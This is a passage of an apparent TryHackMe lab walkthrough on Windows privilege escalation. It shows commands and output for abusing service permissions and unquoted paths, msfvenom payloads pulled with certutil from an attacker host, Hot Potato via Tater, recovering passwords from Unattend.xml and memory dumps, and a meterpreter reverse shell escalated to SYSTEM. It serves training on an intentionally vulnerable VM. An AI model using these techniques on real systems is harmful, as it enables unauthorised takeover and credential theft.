Sysinternals - www.sysinternals.com

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\Users\user\Desktop\Tools\Accesschk>
```

Note that we have `SERVICE_CHANGE_CONFIG` permission.

#### Change the service configuration

```bat
C:\Users\user\Desktop> sc config daclsvc binpath= "net localgroup administrators user /add"
[SC] ChangeServiceConfig SUCCESS

C:\Users\user\Desktop> sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : net localgroup administrators user /add
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user\Desktop>
```

#### Start the service

```bat
C:\Users\user\Desktop> sc start daclsvc
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.


C:\Users\user\Desktop>
```

The service failed because it doesn't answer correctly to the service API-calls - that's OK.

#### Verify that we are Admin

```bat
C:\Users\user\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

#### Remove the user from the group

Finally, make sure the `user` user is removed from the group

```bat
C:\Windows\system32> net localgroup administrators user /del
The command completed successfully.


C:\Windows\system32> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Windows\system32>
```

---------------------------------------------------------------------------------------

### Task 10: Service Escalation - Unquoted Service Paths

#### Detection

Windows VM

1. Open command prompt and type: `sc qc unquotedsvc`
2. Notice that the “BINARY_PATH_NAME” field displays a path that is not confined between quotes.

#### Exploitation

Kali VM

1. Open command prompt and type: `msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe`
2. Copy the generated file, `common.exe`, to the Windows VM.

Windows VM

1. Place common.exe in ‘C:\Program Files\Unquoted Path Service’.
2. Open command prompt and type: `sc start unquotedsvc`
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: `net localgroup administrators`

For additional practice, it is recommended to attempt the TryHackMe room Steel Mountain ([https://tryhackme.com/room/steelmountain](https://tryhackme.com/room/steelmountain)).

---------------------------------------------------------------------------------------

#### Detect the vulnerability

```bat
C:\Users\user\Desktop>sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user\Desktop>
```

Note that the path contains spaces and isn't quoted!

#### Create a malicious service and share it via HTTP

Next, we create a malicious service with msfvenom and share it via HTTP

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 224 bytes
Final size of exe-service file: 15872 bytes
Saved as: common.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ file common.exe  
common.exe: PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows, 5 sections

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ python -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

#### Download the file to the target machine

```bat
C:\Users\user\Desktop> certutil -urlcache -split -f http://192.168.144.77:8000/common.exe "C:\Program Files\Unquoted Path
 Service\Common.exe"
****  Online  ****
  0000  ...
  3e00
CertUtil: -URLCache command completed successfully.

C:\Users\user\Desktop>
```

#### Start the service

```bat
C:\Users\user\Desktop>sc start unquotedsvc

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 1780
        FLAGS              :

C:\Users\user\Desktop>
```

#### Verify that we are Admin

```bat
C:\Users\user\Desktop>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

Finally, clean up by removing the user from the group.

---------------------------------------------------------------------------------------

### Task 11: Potato Escalation - Hot Potato

#### Exploitation

Windows VM

1. In command prompt type: `powershell.exe -nop -ep bypass`
2. In Power Shell prompt type: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
3. In Power Shell prompt type: `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
4. To confirm that the attack was successful, in Power Shell prompt type: `net localgroup administrators`

---------------------------------------------------------------------------------------

#### Exploit with Hot Potato

```bat
C:\Users\user\Desktop\Tools\Tater>powershell.exe -nop -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\Tater> Import-Module .\Tater.ps1
PS C:\Users\user\Desktop\Tools\Tater> Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
2026-02-16T12:22:37 - Tater (Hot Potato Privilege Escalation) started
Local IP Address = 10.65.167.209
Spoofing Hostname = WPAD
Windows Defender Trigger Enabled
Real Time Console Output Enabled
Run Stop-Tater to stop Tater early
Use Get-Command -Noun Tater* to show available functions
Press any key to stop real time console output

2026-02-16T12:22:37 - Waiting for incoming HTTP connection
2026-02-16T12:22:37 - Flushing DNS resolver cache
2026-02-16T12:22:39 - Starting NBNS spoofer to resolve WPAD to 127.0.0.1
2026-02-16T12:22:42 - WPAD has been spoofed to 127.0.0.1
2026-02-16T12:22:42 - Running Windows Defender signature update
2026-02-16T12:22:53 - HTTP request for /wpad.dat received from 127.0.0.1
2026-02-16T12:22:57 - Attempting to redirect to http://localhost:80/gethashes and trigger relay
2026-02-16T12:22:57 - HTTP request for http://download.windowsupdate.com/v9/windowsupdate/redir/muv4wuredir.cab?2602161
722 received from 127.0.0.1
2026-02-16T12:23:02 - HTTP request for /GETHASHES received from 127.0.0.1
2026-02-16T12:23:03 - HTTP to SMB relay triggered by 127.0.0.1
2026-02-16T12:23:03 - Grabbing challenge for relay from 127.0.0.1
2026-02-16T12:23:03 - Received challenge EABAE1A286198630 for relay from 127.0.0.1
2026-02-16T12:23:03 - Providing challenge EABAE1A286198630 for relay to 127.0.0.1
2026-02-16T12:23:04 - Sending response for \ for relay to 127.0.0.1
2026-02-16T12:23:04 - HTTP to SMB relay authentication successful for \ on 127.0.0.1
2026-02-16T12:23:04 - SMB relay service RSNKGGVUMRUSPYMLFCWO created on 127.0.0.1
2026-02-16T12:23:04 - Command likely executed on 127.0.0.1
2026-02-16T12:23:04 - SMB relay service RSNKGGVUMRUSPYMLFCWO deleted on 127.0.0.1
2026-02-16T12:23:05 - Stopping HTTP listener
2026-02-16T12:23:08 - Tater was successful and has exited
PS C:\Users\user\Desktop\Tools\Tater>
```

#### Verify that we were successful

```bat
C:\Users\user\Desktop> net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user\Desktop>
```

Finally, remove the user from the group.

---------------------------------------------------------------------------------------

### Task 12: Password Mining Escalation - Configuration Files

#### Exploitation

Windows VM

1. Open command prompt and type: `notepad C:\Windows\Panther\Unattend.xml`
2. Scroll down to the `<Password>` property and copy the base64 string that is confined between the `<Value>` tags underneath it.

Kali VM

1. In a terminal, type: `echo [copied base64] | base64 -d`
2. Notice the cleartext password

---------------------------------------------------------------------------------------

#### Find the password

```bat
C:\Users\user\Desktop>type C:\Windows\Panther\Unattend.xml | findstr /i "password value"
                <PathAndCredentials wcm:keyValue="1" wcm:action="add">
                <Password>
                    <Value>cGFzc3dvcmQxMjM=</Value>
                </Password>

C:\Users\user\Desktop>
```

#### Decode the password

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ echo 'cGFzc3dvcmQxMjM=' | base64 -d    
password123  
```

Answer: `password123`

---------------------------------------------------------------------------------------

### Task 13: Password Mining Escalation - Memory

#### Exploitation

Kali VM

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use auxiliary/server/capture/http_basic`
3. In Metasploit (msf > prompt) type: `set uripath x`
4. In Metasploit (msf > prompt) type: `run`

Windows VM

1. Open Internet Explorer and browse to: http://[Kali VM IP Address]/x
2. Open command prompt and type: taskmgr
3. In Windows Task Manager, right-click on the “iexplore.exe” in the “Image Name” columnand select “Create Dump File” from the popup menu.
4. Copy the generated file, iexplore.DMP, to the Kali VM.

Kali VM

1.Place ‘iexplore.DMP’ on the desktop.
2.Open command prompt and type: strings /root/Desktop/iexplore.DMP | grep "Authorization: Basic"
3.Select the Copy the Base64 encoded string.
4.In command prompt type: echo -ne [Base64 String] | base64 -d
5.Notice the credentials in the output.

---------------------------------------------------------------------------------------

#### Start a capture service in Metasploit

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                    
msf > use auxiliary/server/capture/http_basic
msf auxiliary(server/capture/http_basic) > options

Module options (auxiliary/server/capture/http_basic):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   REALM        Secure Site      yes       The authentication realm you'd like to present.
   RedirectURL                   no        The page to redirect users to after they enter basic auth creds
   SRVHOST      0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT      80               yes       The local port to listen on.
   SSL          false            no        Negotiate SSL for incoming connections
   SSLCert                       no        Path to a custom SSL certificate (default is randomly generated)
   URIPATH                       no        The URI to use for this exploit (default is random)


Auxiliary action:

   Name     Description
   ----     -----------
   Capture  Run capture web server



View the full module info with the info, or info -d command.

msf auxiliary(server/capture/http_basic) > set URIPATH x
URIPATH => x
msf auxiliary(server/capture/http_basic) > set SRVHOST tun0
SRVHOST => 192.168.144.77
msf auxiliary(server/capture/http_basic) > run
[*] Auxiliary module running as background job 0.
msf auxiliary(server/capture/http_basic) > 
[*] Using URL: http://192.168.144.77/x
[*] Server started.

```

#### Browse to the service in Internet Explorer

Browse to the service (`http://192.168.144.77/x`) and you are promted to login

![Internet_Explorer_Login](Images/Internet_Explorer_Login.png)

Login with any credentials, and note that they are captured in Metasploit

```bash
msf auxiliary(server/capture/http_basic) > 
[*] Using URL: http://192.168.144.77/x
[*] Server started.
[*] Sending 401 to client 10.65.167.209
[+] HTTP Basic Auth LOGIN 10.65.167.209 "my_user:my_password" / /x

```

#### Launch taskmgr and create a memory dump file

Launch task manager

```bat
C:\Users\user\Desktop>taskmgr

C:\Users\user\Desktop>
```

Select the Internet Explorer process, right click and select `Create Dump File`

![Taskmgr Create Dumpfile](Images/Taskmgr_Create_Dumpfile.png)

Wait for the dumpfile to be created

![Taskmgr Dumpfile Created](Images/Taskmgr_Dumpfile_Created.png)

#### Transfer the dumpfile to Kali

Start an SMB share called `kali`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py kali .
[sudo] password for kali: 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed

```

Then copy the file to the share

```bat
C:\Users\user\AppData\Local\Temp>copy /Y iexplore.DMP \\192.168.144.77\kali\iexplore.DMP
```

#### Search for the encoded password

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ strings -n 8 iexplore.DMP | grep -i "Authorization"
InitializeAuthorizationManagers
```

Nope, no encoded password found!

---------------------------------------------------------------------------------------

### Task 14: Privilege Escalation - Kernal Exploits

#### Establish a shell

Kali VM

1. Open command prompt and type: `msfconsole`
2. In Metasploit (msf > prompt) type: `use multi/handler`
3. In Metasploit (msf > prompt) type: `set payload windows/x64/meterpreter/reverse_tcp`
4. In Metasploit (msf > prompt) type: `set lhost [Kali VM IP Address]`
5. In Metasploit (msf > prompt) type: `run`
6. Open an additional command prompt and type: `msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f exe > shell.exe`
7. Copy the generated file, shell.exe, to the Windows VM.

Windows VM

1. Execute shell.exe and obtain reverse shell

#### Detection & Exploitation

Kali VM

1. In Metasploit (msf > prompt) type: `run post/multi/recon/local_exploit_suggester`
2. Identify `exploit/windows/local/ms16_014_wmi_recv_notif` as a potential privilege escalation
3. In Metasploit (msf > prompt) type: `use exploit/windows/local/ms16_014_wmi_recv_notif`
4. In Metasploit (msf > prompt) type: `set SESSION [meterpreter SESSION number]`
5. In Metasploit (msf > prompt) type: `set LPORT 5555`
6. In Metasploit (msf > prompt) type: `run`

NOTE: The shell might default to your eth0 during this attack. If so, ensure you type set lhost [Kali VM IP Address] and run again.

---------------------------------------------------------------------------------------

#### Create a reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.144.77 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe

┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ file shell.exe  
shell.exe: PE32+ executable (GUI) x86-64, for MS Windows, 3 sections
```

And transfer it to the target machine.

#### Create a multi/handler listener

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                                                            
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 

```

#### Trigger the reverse shell

```bat
C:\Users\user\Desktop>shell.exe

C:\Users\user\Desktop>
```

#### Check the reverse shell

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/Walkthroughs/Medium/Windows_PrivEsc_Arena]
└─$ msfconsole -q                                                                            
msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.144.77:4444 
[*] Sending stage (203846 bytes) to 10.65.167.209
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (192.168.144.77:4444 -> 10.65.167.209:49364) at 2026-02-16 19:38:53 +0100

meterpreter > sysinfo
Computer        : TCM-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 3
Meterpreter     : x64/windows
meterpreter > getuid
Server username: TCM-PC\user
meterpreter > 
```

#### Privilege escalation via Metasploit

Next, we search for exploit suggestions

```bash
meterpreter > run post/multi/recon/local_exploit_suggester
[*] 10.65.167.209 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/lib/rex/proto/ldap.rb:13: warning: already initialized constant Net::LDAP::WhoamiOid
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/net-ldap-0.20.0/lib/net/ldap.rb:344: warning: previous definition of WhoamiOid was here
[*] 10.65.167.209 - 206 exploit checks are being tried...
[+] 10.65.167.209 - exploit/windows/local/always_install_elevated: The target is vulnerable.
[+] 10.65.167.209 - exploit/windows/local/bypassuac_comhijack: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/bypassuac_dotnet_profiler: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/bypassuac_sdclt: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/cve_2019_1458_wizardopium: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move: The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
[+] 10.65.167.209 - exploit/windows/local/cve_2020_1054_drawiconex_lpe: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/cve_2021_40449: The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
[+] 10.65.167.209 - exploit/windows/local/ms10_092_schelevator: The service is running, but could not be validated.
[+] 10.65.167.209 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/ms15_078_atmfd_bof: The service is running, but could not be validated.
[+] 10.65.167.209 - exploit/windows/local/ms16_014_wmi_recv_notif: The target appears to be vulnerable.
[+] 10.65.167.209 - exploit/windows/local/tokenmagic: The target appears to be vulnerable.
[*] Running check method for exploit 49 / 49
[*] 10.65.167.209 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/always_install_elevated                  Yes                      The target is vulnerable.
 2   exploit/windows/local/bypassuac_comhijack                      Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/bypassuac_dotnet_profiler                Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/bypassuac_eventvwr                       Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/bypassuac_sdclt                          Yes                      The target appears to be vulnerable.
 6   exploit/windows/local/cve_2019_1458_wizardopium                Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/cve_2020_0787_bits_arbitrary_file_move   Yes                      The service is running, but could not be validated. Vulnerable Windows 7/Windows Server 2008 R2 build detected!
 8   exploit/windows/local/cve_2020_1054_drawiconex_lpe             Yes                      The target appears to be vulnerable.
 9   exploit/windows/local/cve_2021_40449                           Yes                      The service is running, but could not be validated. Windows 7/Windows Server 2008 R2 build detected!
 10  exploit/windows/local/ms10_092_schelevator                     Yes                      The service is running, but could not be validated.
 11  exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 12  exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 13  exploit/windows/local/ms15_078_atmfd_bof                       Yes                      The service is running, but could not be validated.
 14  exploit/windows/local/ms16_014_wmi_recv_notif                  Yes                      The target appears to be vulnerable.
 15  exploit/windows/local/tokenmagic                               Yes                      The target appears to be vulnerable.
 16  exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 17  exploit/windows/local/bits_ntlm_token_impersonation            No                       The target is not exploitable.
 18  exploit/windows/local/bypassuac_fodhelper                      No                       The target is not exploitable.
 19  exploit/windows/local/bypassuac_sluihijack                     No                       The target is not exploitable.
 20  exploit/windows/local/canon_driver_privesc                     No                       The target is not exploitable. No Canon TR150 driver directory found
 21  exploit/windows/local/capcom_sys_exec                          No                       The target is not exploitable.
 22  exploit/windows/local/cve_2020_0796_smbghost                   No                       The target is not exploitable.
 23  exploit/windows/local/cve_2020_1048_printerdemon               No                       The target is not exploitable.
 24  exploit/windows/local/cve_2020_1313_system_orchestrator        No                       The target is not exploitable.
 25  exploit/windows/local/cve_2020_1337_printerdemon               No                       The target is not exploitable.
 26  exploit/windows/local/cve_2020_17136                           No                       The target is not exploitable. The build number of the target machine does not appear to be a vulnerable version!                                                                                                                                                                                                            
 27  exploit/windows/local/cve_2021_21551_dbutil_memmove            No                       The target is not exploitable.
 28  exploit/windows/local/cve_2022_21882_win32k                    No                       The target is not exploitable.
 29  exploit/windows/local/cve_2022_21999_spoolfool_privesc         No                       The target is not exploitable. Windows 7 is technically vulnerable, though it requires a reboot.
 30  exploit/windows/local/cve_2022_3699_lenovo_diagnostics_driver  No                       The target is not exploitable.
 31  exploit/windows/local/cve_2023_21768_afd_lpe                   No                       The target is not exploitable. The exploit only supports Windows 11 22H2
 32  exploit/windows/local/cve_2023_28252_clfs_driver               No                       The target is not exploitable. The target system does not have clfs.sys in system32\drivers\
 33  exploit/windows/local/cve_2024_30085_cloud_files               No                       The target is not exploitable.
 34  exploit/windows/local/cve_2024_30088_authz_basep               No                       The target is not exploitable. Version detected: Windows 7 Service Pack 1. Revision number detected: 0.
 35  exploit/windows/local/cve_2024_35250_ks_driver                 No                       The target is not exploitable. Version detected: Windows 7 Service Pack 1
 36  exploit/windows/local/gog_galaxyclientservice_privesc          No                       The target is not exploitable. Galaxy Client Service not found
 37  exploit/windows/local/ikeext_service                           No                       The check raised an exception.
 38  exploit/windows/local/lexmark_driver_privesc                   No                       The target is not exploitable. No Lexmark print drivers in the driver store
 39  exploit/windows/local/ms16_032_secondary_logon_handle_privesc  No                       The target is not exploitable.
 40  exploit/windows/local/ms16_075_reflection                      No                       The target is not exploitable.
 41  exploit/windows/local/ms16_075_reflection_juicy                No                       The target is not exploitable.
 42  exploit/windows/local/ntapphelpcachecontrol                    No                       The check raised an exception.
 43  exploit/windows/local/nvidia_nvsvc                             No                       The check raised an exception.
 44  exploit/windows/local/panda_psevents                           No                       The target is not exploitable.
 45  exploit/windows/local/ricoh_driver_privesc                     No                       The target is not exploitable. No Ricoh driver directory found
 46  exploit/windows/local/srclient_dll_hijacking                   No                       The target is not exploitable. Target is not Windows Server 2012.
 47  exploit/windows/local/virtual_box_opengl_escape                No                       The target is not exploitable.
 48  exploit/windows/local/webexec                                  No                       The check raised an exception.
 49  exploit/windows/local/win_error_cve_2023_36874                 No                       The target is not exploitable.

meterpreter > 
```

Select the exploit

```bash
meterpreter > Ctrl+Z
Background session 1? [y/N]  y
[-] Unknown command: y. Run the help command for more details.
msf exploit(multi/handler) > use exploit/windows/local/ms16_014_wmi_recv_notif
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf exploit(windows/local/ms16_014_wmi_recv_notif) > set SESSION 1
SESSION => 1
msf exploit(windows/local/ms16_014_wmi_recv_notif) > set LHOST tun0
LHOST => 192.168.144.77
msf exploit(windows/local/ms16_014_wmi_recv_notif) > set LPORT 5555
LPORT => 5555
msf exploit(windows/local/ms16_014_wmi_recv_notif) > run
[*] Started reverse TCP handler on 192.168.144.77:5555 
[*] Reflectively injecting the exploit DLL and running it...
[*] Launching netsh to host the DLL...
[+] Process 748 launched.
[*] Reflectively injecting the DLL into 748...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 10.65.167.209
[*] Meterpreter session 2 opened (192.168.144.77:5555 -> 10.65.167.209:49374) at 2026-02-16 19:46:31 +0100

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```

---------------------------------------------------------------------------------------

For additional information, please see the references below.

## References

- [AccessChk - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk)
- [Autoruns - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns)
- [base64 - Linux manual page](https://man7.org/linux/man-pages/man1/base64.1.html)
- [Base64 - Wikipedia](https://en.wikipedia.org/wiki/Base64)
- [certutil - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/certutil)
- [copy - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/copy)
- [file - Linux manual page](https://man7.org/linux/man-pages/man1/file.1.html)
- [findstr - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/findstr)
- [Get-Acl - Microsoft Learn](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/get-acl?view=powershell-5.1)
- [icacls - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls)
- [Metasploit - Documentation](https://docs.metasploit.com/)
- [Metasploit - Homepage](https://www.metasploit.com/)
- [Metasploit-Framework - Kali Tools](https://www.kali.org/tools/metasploit-framework/)
- [Msfvenom - Metasploit Docs](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Msfvenom - Kali Tools](https://www.kali.org/tools/metasploit-framework/#msfvenom)
- [msiexec - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec)
- [Net localgroup - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc725622(v=ws.11))
- [Process Monitor - Homepage](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [reg add - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-add)
- [reg query - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-query)
- [Remote Desktop Protocol - Wikipedia](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [Sc - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754599(v=ws.11))
- [Sc qc - Microsoft Learn](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc742055(v=ws.11))
- [Tater - GitHub](https://github.com/Kevin-Robertson/Tater)
- [type - Microsoft Learn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/type)
- [xfreerdp - Linux manual page](https://linux.die.net/man/1/xfreerdp)
